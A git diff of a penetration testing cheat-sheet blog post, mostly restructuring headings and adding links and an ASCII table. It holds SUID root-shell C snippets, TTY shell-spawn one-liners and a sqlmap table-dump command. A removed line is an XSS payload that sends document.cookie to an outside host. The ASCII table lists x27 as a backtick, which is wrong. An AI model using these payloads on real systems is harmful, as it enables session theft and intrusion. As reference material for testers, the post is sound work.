@@ -1,25 +1,28 @@
 ---
 layout: blog_item
-title:  "Penetration Testing Cheat Sheet"
-date:   2015-06-16 23:22:10
+title:  "Penetration Testing Tools Cheat Sheet"
+date:   2016-06-16 22:22:10
 author: Arr0way
-description: 'Penetration testing cheat sheet, a quick reference sheet for penetration testing or pen testing exams.'
+description: 'Penetration testing tools cheat sheet, a high level overview / quick reference cheat sheet for penetration testing.'
 categories: [cheat-sheet]
 tags:
 - Windows
 - SMB
 - Linux
 - Tools
+- 'Penetration Testing'
 ---
 
 * list element with functor item
 {:toc}
 
-**Penetration testing cheat sheet**, a quick reference for typical penetration testing or pen testing exams, this is not designed to be an in depth list of commands more like a quick reference cheat sheet giving a high level overview of the **typical** commands you would run against a target. For more in depth information I'd recommend the man file for the specific tool.
+**Penetration testing tools cheat sheet**, a quick reference high level overview for typical [penetration testing](https://bluewire-security.com/penetration-testing/) engagements. Designed as a quick reference cheat sheet providing a high level overview of the **typical** commands you would run when performing a penetration test. For more in depth information I'd recommend the man file for the tool or a more specific [pen testing cheat sheet](/blog/cheat-sheet/).
 
 ## Recon and Enumeration
 
 ### NMAP Commands
+
+For more commands, see [nmap cheat sheet](/blog/nmap-cheat-sheet/).
 
 <div class="mobile-side-scroller">
 <table>
@@ -75,6 +78,8 @@ tags:
 
 ## SMB enumeration
 
+Also see, [nbtscan cheat sheet](/blog/nbtscan-cheat-sheet/).
+
   <div class="mobile-side-scroller">
   <table>
     <thead>
@@ -85,7 +90,7 @@ tags:
     </thead>
         <tbody>
         <tr>
-        <td>/
+        <td>
           <p><code>nbtscan 192.168.1.0/24</code></p>
         </td>
         <td><p>Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain</p></td>
@@ -162,7 +167,9 @@ Enumerate Windows shares / Samba shares.
 </table>
 </div>
 
-### Misc Stuffs
+## Python Local Web Server
+
+Python local web server command, handy for serving up shells and exploits on an attacking machine.
 
 <div class="mobile-side-scroller">
 <table>
@@ -187,7 +194,7 @@ Enumerate Windows shares / Samba shares.
 </div>
 
 
-### Mounting File Shares
+## Mounting File Shares
 
 How to mount NFS / CIFS, Windows and Linux file shares.
 
@@ -239,7 +246,7 @@ How to mount NFS / CIFS, Windows and Linux file shares.
 </div>
 
 
-### Basic Finger Printing Versioning
+## Basic Finger Printing Versioning
 
 
 <div class="mobile-side-scroller">
@@ -266,7 +273,7 @@ How to mount NFS / CIFS, Windows and Linux file shares.
 </div>
 
 
-### SNMP Enumeration
+## SNMP Enumeration
 
 <div class="mobile-side-scroller">
 <table>
@@ -291,7 +298,7 @@ How to mount NFS / CIFS, Windows and Linux file shares.
 </div>
 
 
-### DNS Zone Transfers
+## DNS Zone Transfers
 
 <div class="mobile-side-scroller">
 <table>
@@ -340,7 +347,7 @@ How to mount NFS / CIFS, Windows and Linux file shares.
 </section>
 
 
-### HTTP / HTTPS Webserver Enumeration
+## HTTP / HTTPS Webserver Enumeration
 
 <div class="mobile-side-scroller">
 <table>
@@ -373,7 +380,7 @@ How to mount NFS / CIFS, Windows and Linux file shares.
 </table>
 </div>
 
-### Packet Inspection
+## Packet Inspection
 
 <div class="mobile-side-scroller">
 <table>
@@ -396,11 +403,11 @@ How to mount NFS / CIFS, Windows and Linux file shares.
 </table>
 </div>
 
-### Username Enumeration
+## Username Enumeration
 
 Some techniques used to remotely enumerate users on a target system.
 
-#### SMB User Enumeration
+### SMB User Enumeration
 
 <div class="mobile-side-scroller">
 <table>
@@ -419,11 +426,10 @@ Some techniques used to remotely enumerate users on a target system.
            <p>Enumerate users from SMB</p>
       </td>
     </tr>
-  </tbody>
 </table>
 </div>
 
-#### SNMP User Enumeration
+### SNMP User Enumeration
 
 <div class="mobile-side-scroller">
 <table>
@@ -462,14 +468,13 @@ Some techniques used to remotely enumerate users on a target system.
 
 
 
-  </tbody>
 </table>
 </div>
 
 
 ## Passwords
 
-### Word lists
+### Wordlists
 
 <div class="mobile-side-scroller">
 <table>
@@ -494,9 +499,9 @@ Some techniques used to remotely enumerate users on a target system.
 </div>
 
 
-### Brute Forcing Services
+## Brute Forcing Services
 
-#### Hydra FTP Brute Force
+### Hydra FTP Brute Force
 
 <div class="mobile-side-scroller">
 <table>
@@ -519,7 +524,7 @@ Some techniques used to remotely enumerate users on a target system.
 </table>
 </div>
 
-#### Hydra POP3 Brute Force
+### Hydra POP3 Brute Force
 
 
 <div class="mobile-side-scroller">
@@ -543,7 +548,7 @@ Some techniques used to remotely enumerate users on a target system.
 </table>
 </div>
 
-#### Hydra SMTP Brute Force
+### Hydra SMTP Brute Force
 
 <div class="mobile-side-scroller">
 <table>
@@ -569,9 +574,9 @@ Some techniques used to remotely enumerate users on a target system.
 Use <code>-t</code> to limit concurrent connections, example: <code>-t 15</code>  
 
 
-### Password Cracking
+## Password Cracking
 
-#### John The Ripper - JTR
+### John The Ripper - JTR
 
 <div class="mobile-side-scroller">
 <table>
@@ -612,7 +617,7 @@ Use <code>-t</code> to limit concurrent connections, example: <code>-t 15</code>
 
 
 
-### Exploit Research
+## Exploit Research
 
 Ways to find exploits for enumerated hosts / services.
 
@@ -657,11 +662,20 @@ Ways to find exploits for enumerated hosts / services.
 </table>
 </div>
 
-### Compiling Exploits
+## Windows Penetration Testing Commands
+
+See **Windows Penetration Testing Commands**.  
+
+
+## Linux Penetration Testing Commands
+
+See [Linux Penetration Testing Commands Cheat Sheet](/blog/linux-commands-cheat-sheet/) for a list of Linux Penetration testing commands, useful for local system enumeration.
+
+## Compiling Exploits
 
 Some notes on compiling exploits.
 
-#### Identifying if C code is for Windows or Linux
+### Identifying if C code is for Windows or Linux
 
 C #includes will indicate which OS should be used to build the exploit.
 
@@ -697,7 +711,7 @@ C #includes will indicate which OS should be used to build the exploit.
 </table>
 </div>
 
-#### Build Exploit GCC
+### Build Exploit GCC
 
 Compile exploit gcc.
 
@@ -725,7 +739,7 @@ Compile exploit gcc.
 </table>
 </div>
 
-#### GCC Compile 32Bit Exploit on 64Bit Kali
+### GCC Compile 32Bit Exploit on 64Bit Kali
 
 Handy for cross compiling 32 bit binaries on 64 bit attacking machines.  
 
@@ -747,11 +761,10 @@ Handy for cross compiling 32 bit binaries on 64 bit attacking machines.
       </td>
     </tr>
 
-  </tbody>
 </table>
 </div>
 
-#### Compile Windows .exe on Linux
+### Compile Windows .exe on Linux
 
 Build / compile windows exploits on Linux, resulting in a .exe file.
 
@@ -773,17 +786,16 @@ Build / compile windows exploits on Linux, resulting in a .exe file.
       </td>
     </tr>
 
-  </tbody>
 </table>
 </div>
 
-### SUID Binary
+## SUID Binary
 
 Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.
 
 below are some quick copy and pate examples for various shells:
 
-#### SUID C for /bin/bash   
+### SUID C Shell for /bin/bash   
 
 {% highlight c %}
 int main(void){
@@ -792,7 +804,7 @@ int main(void){
 }       
 {% endhighlight %}
 
-#### SUID C for /bin/sh
+### SUID C Shell for /bin/sh
 
 {% highlight c %}
 int main(void){
@@ -802,7 +814,7 @@ int main(void){
 {% endhighlight %}
 
 
-#### Building the SUID binary
+### Building the SUID Shell binary
 
 {% highlight bash %}
 gcc -o suid suid.c  
@@ -814,12 +826,15 @@ For 32 bit:
 gcc -m32 -o suid suid.c  
 {% endhighlight %}
 
+## Reverse Shells
 
-### TTY Shells
+See [Reverse Shell Cheat Sheet](/blog/reverse-shell-cheat-sheet/) for a list of useful Reverse Shells.
+
+## TTY Shells
 
 Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.
 
-##### Python TTY Shell Trick  
+### Python TTY Shell Trick  
 
 {% highlight python %}
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -833,32 +848,32 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
 {% endhighlight %}
 
-#### Spawn Interactive sh shell
+### Spawn Interactive sh shell
 
 {% highlight bash %}
 /bin/sh -i
 {% endhighlight %}
 
-#### Spawn Perl TTY Shell
+### Spawn Perl TTY Shell
 
 {% highlight perl %}
 exec "/bin/sh";
 perl —e 'exec "/bin/sh";'
 {% endhighlight %}
 
-#### Spawn Ruby TTY Shell
+### Spawn Ruby TTY Shell
 
 {% highlight ruby %}
 exec "/bin/sh"
 {% endhighlight %}
 
-#### Spawn Lua TTY Shell
+### Spawn Lua TTY Shell
 
 {% highlight lua %}
 os.execute('/bin/sh')
 {% endhighlight %}
 
-#### Spawn TTY Shell from Vi
+### Spawn TTY Shell from Vi
 
 Run shell commands from vi:
 
@@ -866,7 +881,7 @@ Run shell commands from vi:
 :!bash
 {% endhighlight %}
 
-#### Spawn TTY Shell NMAP
+### Spawn TTY Shell NMAP
 
 {% highlight bash %}
 !sh
@@ -877,9 +892,11 @@ Run shell commands from vi:
 
 Some basic Metasploit stuff, that I have found handy for reference.
 
+Basic Metasploit commands, useful for reference, for pivoting see - [Meterpreter Pivoting](/blog/ssh-meterpreter-pivoting-techniques/) techniques.
+
 ### Meterpreter Payloads
 
-#### Windows reverse meterpreter payload
+### Windows reverse meterpreter payload
 
 <div class="mobile-side-scroller">
 <table>
@@ -904,8 +921,7 @@ Some basic Metasploit stuff, that I have found handy for reference.
 </table>
 </div>
 
-#### Windows VNC Meterpreter payload
-
+### Windows VNC Meterpreter payload
 
 <div class="mobile-side-scroller">
 <table>
@@ -931,7 +947,7 @@ Some basic Metasploit stuff, that I have found handy for reference.
 </table>
 </div>
 
-#### Linux Reverse Meterpreter payload
+### Linux Reverse Meterpreter payload
 
 <div class="mobile-side-scroller">
 <table>
@@ -956,9 +972,9 @@ Some basic Metasploit stuff, that I have found handy for reference.
 </table>
 </div>
 
-### Meterpreter Commands
+## Meterpreter Cheat Sheet
 
-Some useful meterpreter commands.
+Useful meterpreter commands.
 
 <div class="mobile-side-scroller">
 <table>
@@ -1064,11 +1080,11 @@ Some useful meterpreter commands.
 </table>
 </div>
 
-### Common Metasploit Modules
+## Common Metasploit Modules
 
 Top metasploit modules.
 
-#### Remote Windows Metasploit Modules (exploits)
+### Remote Windows Metasploit Modules (exploits)
 
 <div class="mobile-side-scroller">
 <table>
@@ -1110,7 +1126,7 @@ Top metasploit modules.
 </table>
 </div>
 
-#### Local Windows Metasploit Modules (exploits)
+### Local Windows Metasploit Modules (exploits)
 
 
 <div class="mobile-side-scroller">
@@ -1135,7 +1151,7 @@ Top metasploit modules.
 </div>
 
 
-#### Auxilary Metasploit Modules
+### Auxilary Metasploit Modules
 
 <div class="mobile-side-scroller">
 <table>
@@ -1188,11 +1204,10 @@ Top metasploit modules.
       </td>
     </tr>
 
-  </tbody>
 </table>
 </div>
 
-#### Metasploit Powershell Modules
+### Metasploit Powershell Modules
 
 <div class="mobile-side-scroller">
 <table>
@@ -1241,7 +1256,7 @@ Top metasploit modules.
 </div>
 
 
-#### Post Exploit Windows Metasploit Modules
+### Post Exploit Windows Metasploit Modules
 
 <div class="mobile-side-scroller">
 <table>
@@ -1278,6 +1293,7 @@ Top metasploit modules.
             <p>Metasplit load Mimikatz</p>
       </td>
     </tr>
+    <tr>
       <td>
         <p><code>run post/windows/gather/local_admin_search_enum</code></p>
       </td>
@@ -1331,6 +1347,7 @@ Top metasploit modules.
             <p><code>255</code></p>
       </td>
     </tr>
+     <tr>
       <td>
         <p>Cisco / Network</p>
       </td>
@@ -1345,11 +1362,11 @@ Top metasploit modules.
 
 
 
-### IPv4
+## IPv4
 
-#### Classful IP Ranges
+### Classful IP Ranges
 
-E.g Class A,B,C (depreciated, but unfortunately still taught)
+E.g Class A,B,C (depreciated)
 
 <div class="mobile-side-scroller">
 <table>
@@ -1404,7 +1421,8 @@ E.g Class A,B,C (depreciated, but unfortunately still taught)
 </table>
 </div>
 
-#### Private Address Ranges
+### IPv4 Private Address Ranges
+
 
 <div class="mobile-side-scroller">
 <table>
@@ -1451,8 +1469,7 @@ E.g Class A,B,C (depreciated, but unfortunately still taught)
 </table>
 </div>
 
-#### Subnet Cheat Sheet  
-
+### IPv4 Subnet Cheat Sheet  
 
 <div class="mobile-side-scroller">
 <table>
@@ -1758,8 +1775,900 @@ E.g Class A,B,C (depreciated, but unfortunately still taught)
 </table>
 </div>
 
+## ASCII Table Cheat Sheet  
 
-## CISCO Commands
+Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.
+
+<div class="mobile-side-scroller">
+<table>
+  <thead>
+    <tr>
+      <th>ASCII</th>
+      <th>Character</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>
+        <p><code>x00</code></p>
+      </td>
+      <td>
+        <p>Null Byte</p>
+      </td>
+    </tr>
+
+   <tr>
+    <td>
+      <p><code>x08</code></p>
+    </td>
+    <td>
+      <p>BS</p>
+    </td>
+  </tr>
+
+  <tr>
+   <td>
+     <p><code>x09</code></p>
+   </td>
+   <td>
+     <p>TAB</p>
+   </td>
+ </tr>
+
+ <tr>
+  <td>
+    <p><code>x0a</code></p>
+  </td>
+  <td>
+    <p>LF</p>
+  </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x0d</code></p>
+ </td>
+ <td>
+   <p>CR</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x1b</code></p>
+ </td>
+ <td>
+   <p>ESC</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x20</code></p>
+ </td>
+ <td>
+   <p>SPC</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x21</code></p>
+ </td>
+ <td>
+   <p>!</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x22</code></p>
+ </td>
+ <td>
+   <p>"</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x23</code></p>
+ </td>
+ <td>
+   <p>#</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x24</code></p>
+ </td>
+ <td>
+   <p>$</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x25</code></p>
+ </td>
+ <td>
+   <p>%</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x26</code></p>
+ </td>
+ <td>
+   <p>&</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x27</code></p>
+ </td>
+ <td>
+   <p>`</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x28</code></p>
+ </td>
+ <td>
+   <p>(</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x29</code></p>
+ </td>
+ <td>
+   <p>)</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x2a</code></p>
+ </td>
+ <td>
+   <p>*</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x2b</code></p>
+ </td>
+ <td>
+   <p>+</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x2c</code></p>
+ </td>
+ <td>
+   <p>,</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x2d</code></p>
+ </td>
+ <td>
+   <p>-</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x2e</code></p>
+ </td>
+ <td>
+   <p>.</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x2f</code></p>
+ </td>
+ <td>
+   <p>/</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x30</code></p>
+ </td>
+ <td>
+   <p>0</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x31</code></p>
+ </td>
+ <td>
+   <p>1</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x32</code></p>
+ </td>
+ <td>
+   <p>2</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x33</code></p>
+ </td>
+ <td>
+   <p>3</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x34</code></p>
+ </td>
+ <td>
+   <p>4</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x35</code></p>
+ </td>
+ <td>
+   <p>5</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x36</code></p>
+ </td>
+ <td>
+   <p>6</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x37</code></p>
+ </td>
+ <td>
+   <p>7</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x38</code></p>
+ </td>
+ <td>
+   <p>8</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x39</code></p>
+ </td>
+ <td>
+   <p>9</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x3a</code></p>
+ </td>
+ <td>
+   <p>:</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x3b</code></p>
+ </td>
+ <td>
+   <p>;</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x3c</code></p>
+ </td>
+ <td>
+   <p><</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x3d</code></p>
+ </td>
+ <td>
+   <p>=</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x3e</code></p>
+ </td>
+ <td>
+   <p>></p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x3f</code></p>
+ </td>
+ <td>
+   <p>?</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x40</code></p>
+ </td>
+ <td>
+   <p>@</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x41</code></p>
+ </td>
+ <td>
+   <p>A</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x42</code></p>
+ </td>
+ <td>
+   <p>B</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x43</code></p>
+ </td>
+ <td>
+   <p>C</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x44</code></p>
+ </td>
+ <td>
+   <p>D</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x45</code></p>
+ </td>
+ <td>
+   <p>E</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x46</code></p>
+ </td>
+ <td>
+   <p>F</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x47</code></p>
+ </td>
+ <td>
+   <p>G</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x48</code></p>
+ </td>
+ <td>
+   <p>H</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x49</code></p>
+ </td>
+ <td>
+   <p>I</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x4a</code></p>
+ </td>
+ <td>
+   <p>J</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x4b</code></p>
+ </td>
+ <td>
+   <p>K</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x4c</code></p>
+ </td>
+ <td>
+   <p>L</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x4d</code></p>
+ </td>
+ <td>
+   <p>M</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x4e</code></p>
+ </td>
+ <td>
+   <p>N</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x4f</code></p>
+ </td>
+ <td>
+   <p>O</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x50</code></p>
+ </td>
+ <td>
+   <p>P</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x51</code></p>
+ </td>
+ <td>
+   <p>Q</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x52</code></p>
+ </td>
+ <td>
+   <p>R</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x53</code></p>
+ </td>
+ <td>
+   <p>S</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x54</code></p>
+ </td>
+ <td>
+   <p>T</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x55</code></p>
+ </td>
+ <td>
+   <p>U</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x56</code></p>
+ </td>
+ <td>
+   <p>V</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x57</code></p>
+ </td>
+ <td>
+   <p>W</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x58</code></p>
+ </td>
+ <td>
+   <p>X</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x59</code></p>
+ </td>
+ <td>
+   <p>Y</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x5a</code></p>
+ </td>
+ <td>
+   <p>Z</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x5b</code></p>
+ </td>
+ <td>
+   <p>[</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x5c</code></p>
+ </td>
+ <td>
+   <p>\</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x5d</code></p>
+ </td>
+ <td>
+   <p>]</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x5e</code></p>
+ </td>
+ <td>
+   <p>^</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x5f</code></p>
+ </td>
+ <td>
+   <p>_</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x60</code></p>
+ </td>
+ <td>
+   <p>`</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x61</code></p>
+ </td>
+ <td>
+   <p>a</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x62</code></p>
+ </td>
+ <td>
+   <p>b</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x63</code></p>
+ </td>
+ <td>
+   <p>c</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x64</code></p>
+ </td>
+ <td>
+   <p>d</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x65</code></p>
+ </td>
+ <td>
+   <p>e</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x66</code></p>
+ </td>
+ <td>
+   <p>f</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x67</code></p>
+ </td>
+ <td>
+   <p>g</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x68</code></p>
+ </td>
+ <td>
+   <p>h</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x69</code></p>
+ </td>
+ <td>
+   <p>i</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x6a</code></p>
+ </td>
+ <td>
+   <p>j</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x6b</code></p>
+ </td>
+ <td>
+   <p>k</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x6c</code></p>
+ </td>
+ <td>
+   <p>l</p>
+ </td>
+</tr>
+
+
+<tr>
+ <td>
+   <p><code>x6d</code></p>
+ </td>
+ <td>
+   <p>m</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x6e</code></p>
+ </td>
+ <td>
+   <p>n</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x6f</code></p>
+ </td>
+ <td>
+   <p>o</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x70</code></p>
+ </td>
+ <td>
+   <p>p</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x71</code></p>
+ </td>
+ <td>
+   <p>q</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x72</code></p>
+ </td>
+ <td>
+   <p>r</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x73</code></p>
+ </td>
+ <td>
+   <p>s</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x74</code></p>
+ </td>
+ <td>
+   <p>t</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x75</code></p>
+ </td>
+ <td>
+   <p>u</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x76</code></p>
+ </td>
+ <td>
+   <p>v</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x77</code></p>
+ </td>
+ <td>
+   <p>w</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x78</code></p>
+ </td>
+ <td>
+   <p>x</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x79</code></p>
+ </td>
+ <td>
+   <p>y</p>
+ </td>
+</tr>
+
+<tr>
+ <td>
+   <p><code>x7a</code></p>
+ </td>
+ <td>
+   <p>z</p>
+ </td>
+</tr>
+
+  </tbody>
+</table>
+</div>
+
+## CISCO IOS Commands
+
+A collection of useful Cisco IOS commands.
 
 <div class="mobile-side-scroller">
 <table>
@@ -2022,7 +2931,7 @@ E.g Class A,B,C (depreciated, but unfortunately still taught)
 
 ### Hash Examples
 
-Likely just use hash-identifier for this but here are some example hashes
+Likely just use **hash-identifier** for this but here are some example hashes:
 
 <div class="mobile-side-scroller">
 <table>
@@ -2151,10 +3060,7 @@ Likely just use hash-identifier for this but here are some example hashes
 </table>
 </div>
 
-
-## Basic Web App
-
-### SQLMap Examples
+## SQLMap Examples
 
 <div class="mobile-side-scroller">
 <table>
@@ -2183,14 +3089,6 @@ Likely just use hash-identifier for this but here are some example hashes
       </td>
     </tr>
 
-    <tr>
-      <td>
-        <p><code>//<document.write('<img src="http://highon.coffee/x.gif?cookie=' + document.cookie + '" />)</code></p>
-      </td>
-      <td>
-            <p>XSS steal cookie</p>
-      </td>
-    </tr>
 
     <tr>
       <td>
@@ -2212,13 +3110,8 @@ Likely just use hash-identifier for this but here are some example hashes
 
     <tr>
       <td>
-        <p><code>qlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump</code></p>
+        <p><code>sqlmap -o -u "http://meh/vuln-form" --forms <br> -D database-name -T users --dump</code></p>
       </td>
       <td>
             <p>sqlmap dump and crack hashes for table users on database-name.</p>
       </td>
-    </tr>
-
-  </tbody>
-</table>
-</div>
